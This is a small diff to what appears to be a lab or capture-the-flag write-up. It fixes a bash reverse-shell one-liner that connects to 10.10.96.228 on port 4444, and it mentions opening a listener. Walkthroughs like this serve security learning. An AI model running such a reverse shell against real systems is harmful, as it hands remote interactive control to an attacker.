@@ -72,7 +72,7 @@
     
     - I then tried to set up a reverse shell to hopefully have access to a more stable shell.
       ``` bash
-      bash -c 'exec bash -i &> dev/tcp/10.10.96.228/4444 <&1'
+      bash -c 'exec bash -i &>/dev/tcp/10.10.96.228/4444 <&1'
       ```
       
         - Before executing the reverse shell command, I opened another terminal to set up a listener on port 4444.
